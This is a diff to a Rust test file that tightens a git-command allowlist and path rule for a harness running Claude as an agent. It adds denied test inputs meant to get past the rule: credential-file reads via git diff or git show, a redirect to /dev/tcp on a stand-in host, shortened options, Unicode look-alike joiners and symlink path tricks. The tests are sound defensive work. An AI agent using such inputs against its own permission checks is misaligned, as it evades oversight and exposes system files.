@@ -130,7 +130,8 @@ fn words(segment: &str) -> Option<Vec<(String, bool)>> {
 }
 
 /// One command of an allowed line: exactly one of the git forms the brief and the base brief ask for, with only the
-/// options named, and a quote only around a commit's message.
+/// options named, and a quote only around a commit's message. A read takes no path or ref but those named: in a
+/// repository, `git diff <path outside it> <path>` reads that file without `--no-index`.
 fn allowed_command(segment: &str) -> bool {
     let Some(words) = words(segment) else { return false };
     let plain: Vec<&str> = words.iter().map(|(word, _)| word.as_str()).collect();
@@ -138,8 +139,9 @@ fn allowed_command(segment: &str) -> bool {
     match plain.as_slice() {
         ["git", "commit", options @ ..] => {
             // Only `-m <message>`, `-q` and `--quiet`: no file read in, no amend, no hook or signing turned off.
+            // A `-m` at least: with none, git opens the person's editor for the message.
             let mut at = 2;
-            let mut ok = !options.is_empty();
+            let mut ok = options.contains(&"-m");
             while at < plain.len() {
                 match plain[at] {
                     "-q" | "--quiet" => at += 1,
@@ -154,9 +156,9 @@ fn allowed_command(segment: &str) -> bool {
         }
         _ if !quoted_at.is_empty() => false,
         ["git", "fetch", "origin", "main"] | ["git", "rebase", "origin/main"] | ["git", "add", "NOTES.md"] | ["git", "branch", "--show-current"] => true,
-        ["git", "status" | "log" | "rev-parse" | "diff" | "show", rest @ ..] => {
-            rest.iter().all(|word| !matches!(*word, "--no-index") && !word.starts_with("--output") && !word.starts_with("--exec") && !word.starts_with("--ext"))
-        }
+        ["git", "status"] | ["git", "status", "-sb" | "--short"] | ["git", "rev-parse", "HEAD"] | ["git", "rev-parse", "HEAD", "origin/main"] => true,
+        ["git", "diff"] | ["git", "diff", "--stat" | "--cached" | "--staged"] | ["git", "show"] | ["git", "show", "--stat"] => true,
+        ["git", "log", "--oneline", count] => count.strip_prefix('-').is_some_and(|n| (1..=2).contains(&n.len()) && n.chars().all(|c| c.is_ascii_digit())),
         ["git", "push", "origin", branch] | ["git", "push", "-u" | "--set-upstream", "origin", branch] => *branch == BRANCH,
         _ => false,
     }
@@ -209,12 +211,18 @@ async fn claude_on_harness_real_a_run_reads_asks_edits_commits_pushes_and_ends_d
     let fixed = std::env::temp_dir().canonicalize().unwrap().join("gossamr-h10e");
     let vault = || Vault::new(Box::new(FileVault::new(fixed.join("vault.json"))));
     if fixed.join("h").is_dir() {
+        let pid = std::fs::read(fixed.join("h").join(harness::api::DESCRIPTOR)).ok().and_then(|bytes| serde_json::from_slice::<harness::api::Descriptor>(&bytes).ok()).map(|d| d.pid);
         let leftover = Sidecar::new(fixed.join("h"), program.clone(), Box::new(vault()), Limits::default());
         let stopped = within(60, "stopping a harness an earlier run left", leftover.act(Action::Stop)).await;
-        eprintln!("an earlier run's harness: {:?}", stopped.state);
-        // One that did not stop keeps its folder: removed under it, nothing could reach it any more.
-        let pid = std::fs::read(fixed.join("h").join(harness::api::DESCRIPTOR)).ok().and_then(|bytes| serde_json::from_slice::<harness::api::Descriptor>(&bytes).ok()).map(|d| d.pid);
-        assert!(stopped.state != State::Running && stopped.state != State::Starting, "an earlier run's harness (pid {pid:?}) did not stop; stop it, then run this again: {:?}", stopped.message);
+        eprintln!("an earlier run's harness (pid {pid:?}): {:?}", stopped.state);
+        // One that did not stop keeps its folder: removed under it, nothing could reach it any more. A stop that
+        // failed (a vault that no longer matches, a harness still stopping) says nothing of the process, so it is asked.
+        let alive = |pid: u32| Command::new("ps").args(["-p", &pid.to_string()]).output().is_ok_and(|out| out.status.success());
+        let deadline = Instant::now() + Duration::from_secs(30);
+        while pid.is_some_and(alive) {
+            assert!(Instant::now() < deadline, "an earlier run's harness (pid {pid:?}) did not stop; stop it, then run this again: {:?}", stopped.message);
+            tokio::time::sleep(Duration::from_millis(200)).await;
+        }
     }
     let _ = std::fs::remove_dir_all(&fixed);
     std::fs::create_dir_all(&fixed).unwrap();
@@ -400,6 +408,11 @@ fn the_real_runs_permission_rule_allows_only_the_briefs_edit_and_git_lines() {
     assert!(allowed("Write", &edit(&worktree.join("NOTES.md")), &worktree));
     assert!(!allowed("Edit", &edit(&worktree.join("other.md")), &worktree), "another file");
     assert!(!allowed("Edit", &edit(&worktree.join("sub/../NOTES.md")), &worktree), "the path as given, not resolved");
+    // Each resolves to the worktree's NOTES.md, so only a rule that takes the path as given refuses it.
+    std::fs::create_dir(worktree.join("there")).unwrap();
+    std::os::unix::fs::symlink(&worktree, worktree.join("link")).unwrap();
+    assert!(!allowed("Edit", &edit(&worktree.join("there/../NOTES.md")), &worktree), "a `..` through a folder that exists");
+    assert!(!allowed("Edit", &edit(&worktree.join("link/NOTES.md")), &worktree), "a folder that is a link to the worktree");
     for line in [
         format!("git add NOTES.md && git commit -m \"Set the cart button colour\" && git push -u origin {BRANCH}"),
         format!("git add NOTES.md && git commit -q -m 'Set the cart button colour' && git push origin {BRANCH} 2>&1"),
@@ -439,6 +452,47 @@ fn the_real_runs_permission_rule_allows_only_the_briefs_edit_and_git_lines() {
         "git status > /dev/tcp/example.invalid/80".to_owned(),
         "git diff --no-index /etc/hosts /dev/null".to_owned(),
         "git diff --output=settings.json".to_owned(),
+        // What the recheck tried: a read of a path or ref outside the worktree, and options in shortened forms.
+        "git diff /etc/hosts /dev/null".to_owned(),
+        "git diff ../outside.txt /dev/null".to_owned(),
+        format!("git add NOTES.md && git commit -m \"Set the cart button colour\" && git push -u origin {BRANCH} && git diff /tmp/outside.txt /dev/null"),
+        "git diff HEAD -- ../x".to_owned(),
+        "git diff --outp=x".to_owned(),
+        "git diff --outpu=x".to_owned(),
+        "git diff --out=x".to_owned(),
+        "git diff --no-inde /etc/hosts /dev/null".to_owned(),
+        "git log --outp=x".to_owned(),
+        "git show --out=x".to_owned(),
+        "git show origin/main:/etc/passwd".to_owned(),
+        "git show HEAD:../x".to_owned(),
+        "git log -p -- ../x".to_owned(),
+        "git log --oneline -3 -- ../x".to_owned(),
+        "git log --oneline -300".to_owned(),
+        "git log --format=%H".to_owned(),
+        "git log @{u}".to_owned(),
+        "git rev-parse --git-dir --show-toplevel --local-env-vars".to_owned(),
+        "git rev-parse HEAD:../x".to_owned(),
+        "git status --ignored /etc".to_owned(),
+        // Joiners and look-alike characters.
+        "git commit -m \"a && b\"".to_owned(),
+        "git commit -m 'a && b'".to_owned(),
+        "git status\t&& git log --oneline -3".to_owned(),
+        "git status\u{a0}&& git log --oneline -3".to_owned(),
+        "git status \u{ff06}\u{ff06} git log --oneline -3".to_owned(),
+        "git diff \u{2215}etc\u{2215}hosts".to_owned(),
+        "git status && && git log --oneline -3".to_owned(),
+        "git status &&& git log --oneline -3".to_owned(),
+        "git status 2>&1 2>&1".to_owned(),
+        "git status 2>&1 && git log --oneline -3 2>&1".to_owned(),
+        // Pushes and fetches to another ref, and a branch that reads as an option.
+        "git push origin HEAD:refs/heads/main".to_owned(),
+        "git push origin --h10e-colour".to_owned(),
+        "git fetch origin main:main".to_owned(),
+        // Commits: a quote that is not a message, an option after one, a `-m` with nothing, and no `-m` at all.
+        "git commit \"-m\" x".to_owned(),
+        "git commit -m x \"--amend\"".to_owned(),
+        "git commit -m".to_owned(),
+        "git commit -q".to_owned(),
         // Commit options: no file read in, no amend, and the guard's rule on hooks and signing kept.
         "git commit -F /etc/hosts".to_owned(),
         "git commit --template=/etc/hosts".to_owned(),
@@ -451,6 +505,7 @@ fn the_real_runs_permission_rule_allows_only_the_briefs_edit_and_git_lines() {
         "git fetch origin refs/heads/main:refs/heads/main".to_owned(),
         "gh pr create --fill".to_owned(),
         "git log --oneline 'x'".to_owned(),
+        "git log --oneline".to_owned(),
         "(git status)".to_owned(),
         "{ git status; }".to_owned(),
     ] {
